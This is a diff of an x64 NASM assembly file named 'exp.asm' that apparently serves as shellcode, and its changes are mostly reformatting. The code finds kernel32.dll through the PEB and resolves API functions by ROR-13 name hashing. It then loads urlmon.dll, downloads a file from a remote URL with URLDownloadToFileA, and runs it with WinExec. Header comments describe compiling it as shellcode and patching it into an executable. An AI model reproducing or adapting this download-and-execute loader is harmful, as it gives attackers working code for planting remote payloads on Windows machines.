@@ -1,18 +1,23 @@
+;; dedkuzmich
+;;
 ;; Compile executable:
 ;; $ nasm -f win64 exp.asm -o exp.obj && gcc exp.obj -o exp.exe && ./exp.exe
+;;
 ;; Compile shellcode:
 ;; $ nasm -f bin sc.asm -o sc.obj && python patcher.py && ./outnew.exe
-;; Format:
+;;
+;; Format:  https://github.com/dedkuzmich/nasmfmt_operands_indent
 ;; $ nasmfmt -oi 12 exp.asm
+
         bits        64
-        default     rel     ; RIP-relative addressing (without this, section .data will be ignored)
+        default     rel                        ; RIP-relative addressing (without this, section .data will be ignored)
 
         extern      puts
         extern      strlen
         extern      _ui64toa
         extern      system
         extern      strcmp
-        
+
         extern      GetStdHandle
         extern      WriteFile
         extern      ExitProcess
@@ -59,7 +64,7 @@
 
 
         section     .data
-; DEFAULT
+        ; DEFAULT
 STD_OUTPUT_HANDLE:
         dq          -11
 
@@ -70,7 +75,7 @@ szPause:
         db          "pause", 0
 
 
-; KERNEL32.DLL
+        ; KERNEL32.DLL
 szKernel32:
         db          "kernel32.dll", 0
 
@@ -82,17 +87,17 @@ szLoadLibraryA:
 
 szGetProcAddress:
         db          "GetProcAddress", 0
-  
 
-; URLMON.DLL 
+
+        ; URLMON.DLL
 szUrlmon:
         db          "urlmon.dll", 0
 
 szURLDownloadToFileA:
         db          "URLDownloadToFileA", 0
 
-      
-; STRINGS
+
+        ; STRINGS
 szCalc:
         db          "calc.exe", 0
 
@@ -117,13 +122,13 @@ WinMain:
         %push       proc_context
         %stacksize  flat64
         %assign     %$localsize 64
-          
+
         ; KERNEL32.DLL
         %local      hKernel32:qword
         %local      pLoadLibraryA:qword
         %local      pGetProcAddress:qword
         %local      pWinExec:qword
-        
+
         ; URLMON.DLL
         %local      hUrlmon:qword
         %local      pURLDownloadToFileA:qword
@@ -132,8 +137,8 @@ WinMain:
         ; OTHER VARS
         %local      iNum1:qword
         align_enter %$localsize
-        
-        
+
+
         ; LoadLibraryA
         lea         rcx, [szLoadLibraryA]
         call        GetKernel32ProcAddress
@@ -142,21 +147,21 @@ WinMain:
         lea         rcx, [szGetProcAddress]
         call        GetKernel32ProcAddress
         mov         qword [pGetProcAddress], rax
-                
-        
+
+
         ; KERNEL32.DLL
-        lea         rcx, [szKernel32] 
+        lea         rcx, [szKernel32]
         call        qword [pLoadLibraryA]
         mov         qword [hKernel32], rax
-        ; WinExec     
+        ; WinExec
         mov         rcx, qword [hKernel32]
         lea         rdx, [szWinExec]
         call        qword [pGetProcAddress]
         mov         qword [pWinExec], rax
-        
-        
+
+
         ; URLMON.DLL
-        lea         rcx, [szUrlmon] 
+        lea         rcx, [szUrlmon]
         call        qword [pLoadLibraryA]
         mov         qword [hUrlmon], rax
         ; URLDownloadToFileA
@@ -164,17 +169,17 @@ WinMain:
         lea         rdx, [szURLDownloadToFileA]
         call        qword [pGetProcAddress]
         mov         qword [pURLDownloadToFileA], rax
-        
-        
+
+
         ; CODE
         mov         rcx, [pWinExec]
         mov         rdx, 16
         call        PrintNum
-        
+
         mov         rcx, [pURLDownloadToFileA]
         mov         rdx, 16
         call        PrintNum
-        
+
         ; Download payload
         mov         rcx, 0
         lea         rdx, [szUrl]
@@ -182,20 +187,20 @@ WinMain:
         mov         r9, 0
         mov         qword [rsp+32], 0
         call        qword [pURLDownloadToFileA]
-        
+
         ; Run payload
         lea         rcx, [szPayload]
         mov         rdx, 5
         call        qword [pWinExec]
-        
+
 
         leave      
         restore_regs
         ret        
-        %pop          
-    
-        
-          
+        %pop       
+
+
+
 ;; int GetKernel32ProcAddress (PSTR pProcName)
 ;; pProcName = rcx
 GetKernel32ProcAddress:
@@ -206,27 +211,27 @@ GetKernel32ProcAddress:
         %local      pProcName:qword
         %local      iProcName:qword
         %local      pKernel32:qword
-        
+
         %local      iBase:qword
         %local      cNames:qword
         %local      pFunctions:qword
         %local      pNames:qword
         %local      pNameOrdinals:qword
-        
+
         %local      pName:qword
         %local      idxName:qword
         %local      iOrdinal:qword
         %local      pFunction:qword
         align_enter %$localsize
-        
+
         mov         qword [pProcName], rcx
-        
+
         ; Hash function name
         mov         rcx, qword [pProcName]
         call        Ror13
         mov         qword [iProcName], rax
-        
-        
+
+
         ; Find kernel32.dll base address
         mov         rbx, [gs:0x60]             ; PEB
         mov         rbx, [rbx + 0x18]          ; LDR
@@ -235,82 +240,74 @@ GetKernel32ProcAddress:
         mov         rbx, [rbx]                 ; 3 kernel32.dll
         mov         rbx, [rbx + 0x20]          ; InInitializationOrderLinks (1st entry)
         mov         qword [pKernel32], rbx     ; kernel32.dll base address
-        
-;        mov         rcx, qword [pKernel32]
-;        mov         rdx, 16
-;        call        PrintNum
-        
-        
+
+
         ; Get info from kernel32.dll export directory
-        mov         r12, qword [pKernel32]      ; kernel32.dll base (DOS header)
-        mov         ebx, [r12 + 0x3c]           ; NT header offset
-        add         rbx, r12                    ; NT header
-        mov         ebx, [rbx + 0x18 + 0x70]    ; Export Directory RVA
-        add         rbx, r12                    ; Export Directory
-        
+        mov         r12, qword [pKernel32]     ; kernel32.dll base (DOS header)
+        mov         ebx, [r12 + 0x3c]          ; NT header offset
+        add         rbx, r12                   ; NT header
+        mov         ebx, [rbx + 0x18 + 0x70]   ; Export Directory RVA
+        add         rbx, r12                   ; Export Directory
+
         mov         rcx, 0
-        mov         ecx, [rbx + 0x10]           ; Base (ordinals of functions start from this number)
+        mov         ecx, [rbx + 0x10]          ; Base (ordinals of functions start from this number)
         mov         qword [iBase], rcx
-        
-        mov         ecx, [rbx + 0x14]           ; NumberOfNames
+
+        mov         ecx, [rbx + 0x14]          ; NumberOfNames
         mov         qword [cNames], rcx
-        
-        mov         ecx, [rbx + 0x1c]           ; AddressOfFunctions RVA
-        add         rcx, r12                    ; AddressOfFunctions
+
+        mov         ecx, [rbx + 0x1c]          ; AddressOfFunctions RVA
+        add         rcx, r12                   ; AddressOfFunctions
         mov         qword [pFunctions], rcx
-        
-        mov         ecx, [rbx + 0x20]           ; AddressOfNames RVA
-        add         rcx, r12                    ; AddressOfNames
+
+        mov         ecx, [rbx + 0x20]          ; AddressOfNames RVA
+        add         rcx, r12                   ; AddressOfNames
         mov         qword [pNames], rcx
-        
-        mov         ecx, [rbx + 0x24]           ; AddressOfNameOrdinals RVA
-        add         rcx, r12                    ; AddressOfNameOrdinals
+
+        mov         ecx, [rbx + 0x24]          ; AddressOfNameOrdinals RVA
+        add         rcx, r12                   ; AddressOfNameOrdinals
         mov         qword [pNameOrdinals], rcx
-                
-        
-        ; Find name index                
-        mov         r15, 0                      ; Counter
+
+
+        ; Find name index
+        mov         r15, 0                     ; Counter
 .nextName:
         mov         r12, qword [pNames]
-        mov         ebx, [r12 + 4 * r15]        ; Name RVA    
-        add         rbx, qword [pKernel32]      ; Name
+        mov         ebx, [r12 + 4 * r15]       ; Name RVA
+        add         rbx, qword [pKernel32]     ; Name
         mov         qword [pName], rbx
         mov         qword [idxName], r15
-                
-        mov         rcx, qword [pName]          ; Hash current name
-        call        Ror13     
-        cmp         rax, qword [iProcName]      ; Compare ROR-13 hash with already known value
+
+        mov         rcx, qword [pName]         ; Hash current name
+        call        Ror13
+        cmp         rax, qword [iProcName]     ; Compare ROR-13 hash with already known value
         je          .endLoop
-        
-        inc         r15     
-        cmp         r15, qword [cNames]         ; Max num of iterations = NumberOfNames
-        jne         .nextName  
-.endLoop:  
+
+        inc         r15
+        cmp         r15, qword [cNames]        ; Max num of iterations = NumberOfNames
+        jne         .nextName
+.endLoop:
 
         ; Find ordinal
         mov         rax, 0
         mov         r12, qword [pNameOrdinals]
         mov         r15, qword [idxName]
-        mov         ax, [r12 + 2 * r15]         ; Ordinal = Name index + Base
-        add         rax, qword [iBase]          ; Base is a value of the 1st ordinal (it can be 1, 2, ... N)
+        mov         ax, [r12 + 2 * r15]        ; Ordinal = Name index + Base
+        add         rax, qword [iBase]         ; Base is a value of the 1st ordinal (it can be 1, 2, ... N)
         mov         qword [iOrdinal], rax
-        
+
 
         ; Find address
-        mov         rax, 0        
+        mov         rax, 0
         mov         r12, qword [pFunctions]
         mov         r15, qword [iOrdinal]
         sub         r15, qword [iBase]
-        mov         eax, [r12 + 4 * r15]        ; Function RVA
-        add         rax, qword [pKernel32]      ; Function
+        mov         eax, [r12 + 4 * r15]       ; Function RVA
+        add         rax, qword [pKernel32]     ; Function
         mov         qword [pFunction], rax
-        
-;        mov         rcx, qword [pFunction]
-;        mov         rdx, 16
-;        call        PrintNum
-        
-        mov         rax, qword [pFunction]      ; Return function address
-        
+
+        mov         rax, qword [pFunction]     ; Return function address
+
         leave      
         restore_regs
         ret        
@@ -396,9 +393,9 @@ PrintStr:
         leave      
         restore_regs
         ret        
-        %pop
-        
-        
+        %pop       
+
+
 ;; int Ror13 (PSTR pStr)
 ;; pStr = rcx
 ;; ROR-13 online:   https://asecuritysite.com/hash/ror13_2
@@ -432,4 +429,4 @@ Ror13:
         leave      
         restore_regs
         ret        
-        %pop
+        %pop       
